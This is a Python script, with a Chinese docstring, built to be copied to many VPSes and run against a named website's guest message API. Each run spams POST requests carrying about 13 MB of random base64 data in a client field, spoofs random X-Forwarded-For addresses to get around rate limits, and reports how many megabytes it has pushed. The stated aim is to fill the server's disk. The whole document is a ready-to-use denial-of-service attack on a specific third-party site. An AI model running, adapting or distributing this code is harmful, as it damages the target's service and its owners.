#!/usr/bin/env python3
"""20 VPS 分布式磁盘写满 — 单文件免依赖版
复制到每台VPS直接跑: python3 fill.py
"""
import http.client, json, os, time, threading, random, base64, ssl

URL_HOST = "www.xnmoe.com"
URL_PATH = "/api/messages"
THREADS = 3
PAYLOAD = base64.b64encode(os.urandom(10 * 1024 * 1024)).decode()
PMB = len(PAYLOAD) / 1024 / 1024
stats = {"ok": 0, "mb": 0.0, "err": 0, "timeout": 0}
lock = threading.Lock()
running = True
t0 = time.time()
DURATION = int(os.environ.get("DURATION", "240"))

def send(tid, seq):
    ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    body = json.dumps({
        "content": "1",
        "user": {"name": f"VPS_{tid}_{seq}", "avatar": "", "url": "", "user_type": "guest"},
        "client_info": PAYLOAD
    })
    try:
        conn = http.client.HTTPSConnection(URL_HOST, timeout=300)
        conn.request("POST", URL_PATH, body,
            {"Content-Type": "application/json", "X-Forwarded-For": ip})
        r = conn.getresponse()
        code = r.status
        r.read()
        conn.close()
        return code
    except Exception as e:
        with lock:
            stats["err"] += 1
        return -1

def worker(tid):
    seq = 0
    while running:
        seq += 1
        code = send(tid, seq)
        with lock:
            if code == 200:
                stats["ok"] += 1
                stats["mb"] += PMB
                print(f"  #{stats['ok']:05d} [VPS{tid}] OK Σ{stats['mb']:.0f}MB", flush=True)
            elif code == 429:
                stats["err"] += 1
                print(f"  [VPS{tid}] 429 rate-limited", flush=True)
            else:
                stats["err"] += 1
        time.sleep(6 if code == 200 else 3)

def main():
    global running
    print(f"DISK FILL | {THREADS} threads x {PMB:.1f}MB | {time.strftime('%H:%M:%S')}", flush=True)
    print(f"Duration: {DURATION}s | Target: {URL_HOST}{URL_PATH}\n", flush=True)
    
    for i in range(THREADS):
        threading.Thread(target=worker, args=(i+1,), daemon=True).start()
    
    deadline = time.time() + DURATION
    while time.time() < deadline:
        time.sleep(30)
        with lock:
            ok, mb, err = stats["ok"], stats["mb"], stats["err"]
        e = time.time() - t0
        print(f"  [{time.strftime('%H:%M')}] {e/60:.0f}min OK:{ok} ERR:{err} DATA:{mb:.0f}MB {mb/e if e>0 else 0:.2f}MB/s", flush=True)
    
    running = False
    time.sleep(3)
    with lock:
        ok, mb, err = stats["ok"], stats["mb"], stats["err"]
    e = time.time() - t0
    print(f"\nFINAL: {ok} ok, {err} err, {mb:.0f}MB in {e:.0f}s ({mb/1024:.1f}GB)", flush=True)

if __name__ == "__main__":
    main()
